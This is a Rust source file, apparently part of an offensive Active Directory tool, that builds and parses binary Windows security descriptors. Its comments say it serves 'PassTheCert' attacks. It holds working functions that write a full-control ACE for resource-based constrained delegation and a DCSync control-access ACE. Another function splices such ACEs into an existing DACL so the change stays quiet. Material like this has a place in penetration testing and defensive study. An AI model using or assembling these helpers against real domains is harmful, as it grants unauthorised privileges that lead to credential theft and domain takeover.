//! Minimal binary Security Descriptor builder/parser for RBCD and DCSync ACEs.
//! Implements the subset needed by PassTheCert actions (no impacket dependency).

use anyhow::{anyhow, Result};

// SID

/// Parse "S-1-5-21-..." into raw SID bytes (self-relative LE).
pub fn sid_from_str(s: &str) -> Result<Vec<u8>> {
    let s = s.trim_start_matches('*'); // Certipy sometimes prefixes with *
    let parts: Vec<&str> = s.split('-').collect();
    if parts.len() < 3 || parts[0] != "S" {
        return Err(anyhow!("invalid SID: {s}"));
    }
    let revision = parts[1].parse::<u8>()?;
    let authority = parts[2].parse::<u64>()?;
    let sub_auths: Vec<u32> = parts[3..].iter()
        .map(|p| p.parse::<u32>().map_err(|e| anyhow!("bad sub-authority: {e}")))
        .collect::<Result<_>>()?;
    let mut v = vec![revision, sub_auths.len() as u8];
    let auth_be = authority.to_be_bytes();
    v.extend_from_slice(&auth_be[2..]); // 6 bytes big-endian identifier authority
    for sa in &sub_auths {
        v.extend_from_slice(&sa.to_le_bytes());
    }
    Ok(v)
}

/// Format raw SID bytes as "S-1-5-..." string.
pub fn sid_to_str(b: &[u8]) -> String {
    if b.len() < 8 { return format!("<invalid SID ({} bytes)>", b.len()); }
    let revision = b[0];
    let sub_count = b[1] as usize;
    let auth = u64::from_be_bytes([0, 0, b[2], b[3], b[4], b[5], b[6], b[7]]);
    let mut s = format!("S-{revision}-{auth}");
    for i in 0..sub_count {
        let off = 8 + i * 4;
        if off + 4 > b.len() { break; }
        let sa = u32::from_le_bytes(b[off..off + 4].try_into().unwrap());
        s.push_str(&format!("-{sa}"));
    }
    s
}

/// Administrators SID (S-1-5-32-544) as bytes — used as the SD owner.
pub fn admin_sid() -> Vec<u8> {
    let mut v = vec![0x01, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05];
    v.extend_from_slice(&32u32.to_le_bytes());
    v.extend_from_slice(&544u32.to_le_bytes());
    v
}

// ACE

/// ACCESS_ALLOWED_ACE (type 0x00) — full control mask. Used for RBCD.
pub fn allow_ace(sid: &[u8]) -> Vec<u8> {
    let ace_size = (8 + sid.len()) as u16;
    let mut ace = Vec::new();
    ace.push(0x00);                                   // AceType
    ace.push(0x00);                                   // AceFlags
    ace.extend_from_slice(&ace_size.to_le_bytes());   // AceSize
    ace.extend_from_slice(&0x000F01FFu32.to_le_bytes()); // Mask: full control
    ace.extend_from_slice(sid);
    ace
}

/// ACCESS_ALLOWED_OBJECT_ACE (type 0x05) — for DCSync rights.
/// ADS_RIGHT_DS_CONTROL_ACCESS (0x00100000), ACE_OBJECT_TYPE_PRESENT.
pub fn allow_object_ace(sid: &[u8], guid_str: &str) -> Vec<u8> {
    let guid = guid_to_le_bytes(guid_str);
    let ace_size = (4 + 4 + 4 + guid.len() + sid.len()) as u16; // hdr(4)+mask(4)+flags(4)+guid(16)+sid
    let mut ace = Vec::new();
    ace.push(0x05);                                     // AceType: OBJECT
    ace.push(0x00);                                     // AceFlags
    ace.extend_from_slice(&ace_size.to_le_bytes());     // AceSize
    ace.extend_from_slice(&0x00100000u32.to_le_bytes()); // Mask: ADS_RIGHT_DS_CONTROL_ACCESS
    ace.extend_from_slice(&0x00000001u32.to_le_bytes()); // Flags: ACE_OBJECT_TYPE_PRESENT
    ace.extend_from_slice(&guid);                       // ObjectType GUID
    ace.extend_from_slice(sid);
    ace
}

/// Convert a GUID string "1131f6aa-9c07-..." to 16 raw bytes (mixed-endian).
fn guid_to_le_bytes(guid: &str) -> Vec<u8> {
    let parts: Vec<&str> = guid.split('-').collect();
    if parts.len() != 5 { return vec![0u8; 16]; }
    let d1 = u32::from_str_radix(parts[0], 16).unwrap_or(0).to_le_bytes();
    let d2 = u16::from_str_radix(parts[1], 16).unwrap_or(0).to_le_bytes();
    let d3 = u16::from_str_radix(parts[2], 16).unwrap_or(0).to_le_bytes();
    let d4 = hex::decode(parts[3].to_owned() + parts[4]).unwrap_or_default();
    let mut b = Vec::new();
    b.extend_from_slice(&d1);
    b.extend_from_slice(&d2);
    b.extend_from_slice(&d3);
    b.extend_from_slice(&d4);
    b
}

// SD

/// Build a minimal self-relative Security Descriptor with the given ACEs.
pub fn build_sd(owner_sid: &[u8], aces: &[Vec<u8>]) -> Vec<u8> {
    let acl_body: Vec<u8> = aces.iter().flat_map(|a| a.iter().cloned()).collect();
    let acl_size = (8 + acl_body.len()) as u16;

    let offset_owner = 20u32;
    let offset_dacl = offset_owner + owner_sid.len() as u32;

    let mut sd = Vec::new();
    // SD header (20 bytes)
    sd.push(1u8);                                       // Revision
    sd.push(0u8);                                       // Sbz1
    sd.extend_from_slice(&0x8004u16.to_le_bytes());     // Control: SE_DACL_PRESENT | SE_SELF_RELATIVE
    sd.extend_from_slice(&offset_owner.to_le_bytes());  // OffsetOwner
    sd.extend_from_slice(&0u32.to_le_bytes());          // OffsetGroup
    sd.extend_from_slice(&0u32.to_le_bytes());          // OffsetSacl
    sd.extend_from_slice(&offset_dacl.to_le_bytes());   // OffsetDacl
    // Owner SID
    sd.extend_from_slice(owner_sid);
    // ACL header (8 bytes)
    sd.push(4u8);                                       // AclRevision
    sd.push(0u8);                                       // Sbz1
    sd.extend_from_slice(&acl_size.to_le_bytes());      // AclSize
    sd.extend_from_slice(&(aces.len() as u16).to_le_bytes()); // AceCount
    sd.extend_from_slice(&0u16.to_le_bytes());          // Sbz2
    // ACEs
    sd.extend(acl_body);
    sd
}


/// Append ACEs to an existing self-relative SD's DACL, in place, preserving all
/// existing ACEs untouched. This is the correct way to add rights (e.g. DCSync)
/// without corrupting object-ACEs, inheritance flags, or the owner/group/SACL.
pub fn append_aces(raw_sd: &[u8], new_aces: &[Vec<u8>]) -> Result<Vec<u8>> {
    if raw_sd.len() < 20 {
        return Err(anyhow!("security descriptor too short ({} bytes)", raw_sd.len()));
    }
    let offset_dacl = u32::from_le_bytes(raw_sd[16..20].try_into().unwrap()) as usize;
    if offset_dacl == 0 || offset_dacl + 8 > raw_sd.len() {
        return Err(anyhow!("no DACL present in security descriptor"));
    }

    let mut sd = raw_sd.to_vec();
    // DACL header: [AclRevision(1)][Sbz1(1)][AclSize(2)][AceCount(2)][Sbz2(2)]
    let old_size = u16::from_le_bytes([sd[offset_dacl + 2], sd[offset_dacl + 3]]);
    let old_count = u16::from_le_bytes([sd[offset_dacl + 4], sd[offset_dacl + 5]]);

    let added: Vec<u8> = new_aces.iter().flat_map(|a| a.iter().copied()).collect();
    let new_size = old_size
        .checked_add(added.len() as u16)
        .ok_or_else(|| anyhow!("DACL size overflow"))?;
    let new_count = old_count
        .checked_add(new_aces.len() as u16)
        .ok_or_else(|| anyhow!("ACE count overflow"))?;

    // Insert the new ACE bytes right after the existing DACL body.
    let insert_pos = offset_dacl + old_size as usize;
    if insert_pos > sd.len() {
        return Err(anyhow!("DACL size points past the SD end"));
    }
    sd.splice(insert_pos..insert_pos, added);

    // Patch AclSize and AceCount in the DACL header.
    sd[offset_dacl + 2..offset_dacl + 4].copy_from_slice(&new_size.to_le_bytes());
    sd[offset_dacl + 4..offset_dacl + 6].copy_from_slice(&new_count.to_le_bytes());

    Ok(sd)
}



/// Extract raw (SID-bytes, ace_type) pairs from a binary SD's DACL.
pub fn parse_dacl_entries(sd: &[u8]) -> Vec<(Vec<u8>, u8)> {
    if sd.len() < 20 { return vec![]; }
    let offset_dacl = u32::from_le_bytes(sd[16..20].try_into().unwrap()) as usize;
    if offset_dacl == 0 || offset_dacl + 8 > sd.len() { return vec![]; }
    let dacl = &sd[offset_dacl..];
    let ace_count = u16::from_le_bytes(dacl[4..6].try_into().unwrap()) as usize;
    let mut pos = 8;
    let mut entries = Vec::new();
    for _ in 0..ace_count {
        if pos + 4 > dacl.len() { break; }
        let ace_type = dacl[pos];
        let ace_size = u16::from_le_bytes(dacl[pos + 2..pos + 4].try_into().unwrap()) as usize;
        if ace_size == 0 || pos + ace_size > dacl.len() { break; }
        // Compute SID offset depending on ACE type.
        let sid_start = match ace_type {
            0x00 | 0x01 => pos + 8,   // ACCESS_ALLOWED / ACCESS_DENIED (simple)
            0x05 | 0x06 => {           // OBJECT ACE: check Flags for present GUIDs
                let ace_flags = u32::from_le_bytes(dacl[pos+8..pos+12].try_into().unwrap_or([0;4]));
                let guid_count = (ace_flags & 0x01 != 0) as usize + (ace_flags & 0x02 != 0) as usize;
                pos + 12 + guid_count * 16
            }
            _ => { pos += ace_size; continue; }
        };
        if sid_start < pos + ace_size {
            entries.push((dacl[sid_start..pos + ace_size].to_vec(), ace_type));
        }
        pos += ace_size;
    }
    entries
}